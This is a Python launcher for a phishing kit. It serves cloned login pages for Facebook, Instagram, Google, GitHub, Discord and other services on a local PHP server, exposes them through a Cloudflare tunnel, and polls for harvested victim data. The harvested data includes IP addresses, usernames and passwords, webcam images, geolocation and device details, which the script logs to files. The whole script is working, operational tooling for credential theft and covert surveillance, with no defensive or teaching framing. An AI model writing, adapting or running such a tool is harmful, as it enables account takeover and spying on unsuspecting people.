import os
import time
import sys
import signal
import subprocess

if all(os.system(f"command -v {p} >/dev/null 2>&1") == 0 for p in ("php", "wget")):
	pass
else:
	if os.system("command -v pkg >/dev/null 2>&1") == 0:
		os.system("pkg install wget -y")
		os.system("pkg install php -y")
	else:
		os.system("sudo apt install wget -y")
		os.system("sudo apt install php -y")
		
if os.system("command -v pkg >/dev/null 2>&1") == 0:
	if os.system("command -v cloudflared >/dev/null 2>&1") == 0:
		pass
	else:
		os.system("pkg install cloudflared -y")

GREEN = "\033[0;32m"
PINK = "\033[95;1m"
RED = "\033[0;31m"
YELLOW = "\033[1;33m"

class Data:
	def __init__(self):
		self.port=8080
		self.website=""
		self.url=""
		self.redirect_url=""
		self.newTab=""
data = Data()

if os.path.isdir(".sites"):
	pass
else:
	os.rename("sites" , ".sites")

banner = """
 #                                                    
 #        ####  #    # ###### 
 #       #    # #    # #  
 #       #    # #    # #####     
 #       #    # #    # #  
 #       #    #  #  #  #  
 #######  ####    ##   ###### Logic"""

if os.path.exists(".server/.cloud.log"):
	os.remove(".server/.cloud.log")
if os.path.isdir(".server"):
	pass
else:
	os.system("mkdir .server")
	
if os.system("command -v pkg >/dev/null 2>&1") == 0:
	pass
else:
	if os.path.exists(".server/cloudflared"):
		pass
	else:
		print("Installing Cloudflared")
		time.sleep(2)
		arch = subprocess.getoutput("uname -m")
		if arch == "x86_64":
			os.system("wget -O .server/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64")
		elif arch == "aarch64":
			os.system("wget -O .server/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64")
		elif arch == "arm":
			os.system("wget -O .server/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm")
		else:
			print("exit")
			sys.exit()
		os.system("chmod +x .server/cloudflared")
		os.system("clear")

def signal_handler(sig, frame):
    print(RED+"Program terminated")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def custom_port():
	try:
		p = int(input("Port: "))
		if p <=65535 and p > 0:
			data.port=p
		else:
			print("error")
			custom_port()
	except:
		print("error")
		custom_port()

def select_port():
	cport = input("Do you want a custom port y/N: ")
	if cport == "y":
		custom_port()
	else:
		pass

def print_ip():
	print("IP Found")
	os.system(f"cat .sites/{data.website}/ip.txt")
def print_creds():
	print("Login info")
	os.system(f"cat .sites/{data.website}/usernames.txt")

def check_files():
	print("Waiting for info")
	print(PINK)
	while True:
		if os.path.exists(f".sites/{data.website}/ip.txt"):
			os.system(f"cat .sites/{data.website}/ip.txt >> ip.txt")
			print_ip()
			os.remove(f".sites/{data.website}/ip.txt")

		if os.path.exists(f".sites/{data.website}/usernames.txt"):
			os.system(f"cat .sites/{data.website}/usernames.txt >> userspass.txt")
			print_creds()
			os.remove(f".sites/{data.website}/usernames.txt")

		if os.path.exists(".sites/Cam/.file.txt"):
			print("Image Received")
			os.remove(".sites/Cam/.file.txt")

		if os.path.exists(".sites/Location/user_locations.txt"):
			os.system("cat .sites/Location/user_locations.txt >> user_locations.txt")
			os.system("cat .sites/Location/user_locations.txt")
			os.remove(".sites/Location/user_locations.txt")

		if os.path.exists(".sites/Device/device-info.txt"):
			os.system("cat .sites/Device/device-info.txt >> device-info.txt")
			os.system("cat .sites/Device/device-info.txt")
			os.remove(".sites/Device/device-info.txt")

def localhost():
	select_port()
	os.system(f"php -S 127.0.0.1:{data.port} -t .sites/{data.website} > /dev/null 2>&1 &")
	data.url = f"http://127.0.0.1:{data.port}"

def cloudflared():
	select_port()
	os.system(f"php -S 127.0.0.1:{data.port} -t .sites/{data.website} > /dev/null 2>&1 &")
	time.sleep(3)
	if os.system("command -v cloudflared >/dev/null 2>&1") == 0:
		os.system(f"cloudflared tunnel -url 127.0.0.1:{data.port} --logfile .server/.cloud.log > /dev/null 2>&1 &")
	else:
		os.system(f"./.server/cloudflared tunnel -url 127.0.0.1:{data.port} --logfile .server/.cloud.log > /dev/null 2>&1 &")
	print("Launching Cloudflared...")
	time.sleep(7)
	data.url = subprocess.getoutput("grep -o https://[-0-9a-z]*.trycloudflare.com .server/.cloud.log")

def urls():
	os.system("clear")
	print(GREEN)
	print(f"Url: {data.url}")

def redirect_file():
	# open file in write mode
	file = open('.sites/redirect.php', 'w')

	# write multiple lines to the file
	file.write('<?php\n')
	file.write(f'$url = "{data.redirect_url}";\n')
	file.write(f'$newTab = {data.newTab};\n')
	file.write('if ($newTab) {\n')
	file.write('''	echo "<script>window.open('$url', '_blank');</script>";\n''')
	file.write('	exit();\n')
	file.write('}else {\n')
	file.write('	header("Location: $url");\n')
	file.write('	exit();\n')
	file.write('}\n')
	file.write('?>\n')

	# close the file
	file.close()

def redirect():
	data.redirect_url = input("Redirect Url: ")
	if data.website == "Cam":
		data.newTab = "true"
	else:
		data.newTab = "false"
	redirect_file()

def select():
	print(PINK)
	print("[1] Localhost")
	print("[2] Cloudflared")
	print()
	a = input("Select an option: ")
	if a == "1":
		localhost()
		urls()
		check_files()
	elif a == "2":
		cloudflared()
		urls()
		check_files()
	else:
		print("error")
		os.system("clear")
		time.sleep(2)
		select()


def menu():
	os.system("clear")
	print(banner)
	print(GREEN+"""
[01] Facebook       [14] Pinterest
[02] Instagram      [15] Wordpress
[03] Google         [16] Linkedin
[04] Netflix        [17] StackoverFlow
[05] Free Fire      [18] Device Info
[06] Twitter        [19] Camera
[07] Mediafire      [20] Location
[08] Reddit
[09] Github
[10] Gitlab
[11] Spotify
[12] Adobe
[13] Discord

[00] Exit
		""")
	try:
		x = int(input("Select an option: "))
	except:
		menu()

	if x == 1:
		data.website="Facebook"
		select()
	elif x == 2:
		data.website="Instagram"
		select()
	elif x == 3:
		data.website="Google"
		select()
	elif x == 4:
		data.website="Netflix"
		select()
		select()
	elif x == 5:
		data.website="FreeFire"
		select()
	elif x == 6:
		data.website="Twitter"
		select()
	elif x == 7:
		data.website="Mediafire"
		select()
	elif x == 8:
		data.website="Reddit"
		select()
	elif x == 9:
		data.website="Github"
		select()
	elif x == 10:
		data.website="Gitlab"
		select()
	elif x == 11:
		data.website="Spotify"
		select()
	elif x == 12:
		data.website="Adobe"
		select()
	elif x == 13:
		data.website="Discord"
		select()
	elif x == 14:
		data.website="Pinterest"
		select()
	elif x == 15:
		data.website="Wordpress"
		select()
	elif x == 16:
		data.website="Linkedin"
		select()
	elif x == 17:
		data.website="Stackoverflow"
		select()
	elif x == 18:
		data.website="Device"
		redirect()
		select()
	elif x == 19:
		data.website="Cam"
		select()
	elif x == 20:
		data.website="Location"
		select()

	elif x == 00:
		sys.exit()

	else:
		menu()


menu()
